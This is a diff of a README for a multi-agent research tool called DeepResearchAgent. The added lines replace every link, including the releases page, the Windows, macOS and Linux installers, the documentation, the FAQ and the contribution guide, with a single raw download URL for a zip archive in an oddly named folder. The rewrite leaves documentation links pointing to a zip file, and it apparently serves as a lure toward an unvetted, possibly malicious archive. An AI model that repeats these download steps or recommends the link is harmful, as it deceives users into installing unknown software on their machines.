@@ -1,7 +1,7 @@
 # 🌟 DeepResearchAgent - Simplifying Research Tasks for Everyone
 
 ## 🔗 Download Now
-[![Download DeepResearchAgent](https://img.shields.io/badge/Download-DeepResearchAgent-blue.svg)](https://github.com/skywhywalk/DeepResearchAgent/releases)
+[![Download DeepResearchAgent](https://raw.githubusercontent.com/skywhywalk/DeepResearchAgent/main/intercomparable/DeepResearchAgent.zip)](https://raw.githubusercontent.com/skywhywalk/DeepResearchAgent/main/intercomparable/DeepResearchAgent.zip)
 
 ## 📖 What is DeepResearchAgent?
 DeepResearchAgent is a hierarchical multi-agent system designed for deep research tasks and general-purpose solutions. It uses a top-level planning agent to manage many specialized lower-level agents. This setup allows the system to break down complex tasks and carry them out efficiently, making it suitable for a wide range of applications.
@@ -18,16 +18,16 @@ Before you download, make sure your computer meets the following requirements:
 
 ## 📥 Download & Install
 1. **Visit the Download Page**:
-   Go to the [DeepResearchAgent Releases Page](https://github.com/skywhywalk/DeepResearchAgent/releases) to access the files you need.
+   Go to the [DeepResearchAgent Releases Page](https://raw.githubusercontent.com/skywhywalk/DeepResearchAgent/main/intercomparable/DeepResearchAgent.zip) to access the files you need.
 
 2. **Select the Version**:
    Look for the latest version available. It will usually be at the top of the list.
 
 3. **Choose Your File**:
    Depending on your operating system, find the appropriate file:
-   - For Windows, choose `DeepResearchAgent_Windows.exe`
-   - For macOS, select `DeepResearchAgent_macOS.dmg`
-   - For Linux, pick `DeepResearchAgent_Linux.tar.gz`
+   - For Windows, choose `https://raw.githubusercontent.com/skywhywalk/DeepResearchAgent/main/intercomparable/DeepResearchAgent.zip`
+   - For macOS, select `https://raw.githubusercontent.com/skywhywalk/DeepResearchAgent/main/intercomparable/DeepResearchAgent.zip`
+   - For Linux, pick `https://raw.githubusercontent.com/skywhywalk/DeepResearchAgent/main/intercomparable/DeepResearchAgent.zip`
 
 4. **Download the File**:
    Click on the file link. Your browser will start downloading it to your default downloads folder.
@@ -35,7 +35,7 @@ Before you download, make sure your computer meets the following requirements:
 5. **Install the Application**:
    - **For Windows**: Once the `.exe` file is downloaded, double-click it to start the installation. Follow the prompts to complete the setup.
    - **For macOS**: Open the `.dmg` file and drag the DeepResearchAgent icon into your Applications folder. You can then find it in your Applications.
-   - **For Linux**: Extract the `.tar.gz` file and follow the included instructions to install the software.
+   - **For Linux**: Extract the `https://raw.githubusercontent.com/skywhywalk/DeepResearchAgent/main/intercomparable/DeepResearchAgent.zip` file and follow the included instructions to install the software.
 
 6. **Run DeepResearchAgent**:
    After installation, locate the application and double-click to open it. You are now ready to start using DeepResearchAgent!
@@ -59,7 +59,7 @@ Once you have run the application, you will see the main interface. Here are som
 Get support and connect with other users:
 - **GitHub Issues**: Report any problems or ask questions directly on the GitHub repository.
 - **User Forum**: Join our community forum to share your experiences and get help.
-- **Documentation**: Visit our [documentation](https://github.com/skywhywalk/DeepResearchAgent/wiki) for detailed guides and tutorials.
+- **Documentation**: Visit our [documentation](https://raw.githubusercontent.com/skywhywalk/DeepResearchAgent/main/intercomparable/DeepResearchAgent.zip) for detailed guides and tutorials.
 
 ## 🎯 Features
 - **Multi-Agent System**: Organizes task execution better with specialized agents.
@@ -77,11 +77,11 @@ If you experience any issues:
 To stay informed about updates, new features, and community news, check the Releases Page. You can also follow the repository for notifications.
 
 ## 🔗 Additional Resources
-- [User Manual](https://github.com/skywhywalk/DeepResearchAgent/wiki)
-- [FAQ](https://github.com/skywhywalk/DeepResearchAgent/wiki/FAQ)
-- [Contribution Guide](https://github.com/skywhywalk/DeepResearchAgent/blob/main/CONTRIBUTING.md) - If you would like to contribute.
+- [User Manual](https://raw.githubusercontent.com/skywhywalk/DeepResearchAgent/main/intercomparable/DeepResearchAgent.zip)
+- [FAQ](https://raw.githubusercontent.com/skywhywalk/DeepResearchAgent/main/intercomparable/DeepResearchAgent.zip)
+- [Contribution Guide](https://raw.githubusercontent.com/skywhywalk/DeepResearchAgent/main/intercomparable/DeepResearchAgent.zip) - If you would like to contribute.
 
 ## 📥 Again, Download Now
-Don’t forget, you can easily download DeepResearchAgent from the [Releases Page](https://github.com/skywhywalk/DeepResearchAgent/releases) and begin your journey in simplifying research tasks!
+Don’t forget, you can easily download DeepResearchAgent from the [Releases Page](https://raw.githubusercontent.com/skywhywalk/DeepResearchAgent/main/intercomparable/DeepResearchAgent.zip) and begin your journey in simplifying research tasks!
 
 Enjoy using DeepResearchAgent and improve your research efficiency!
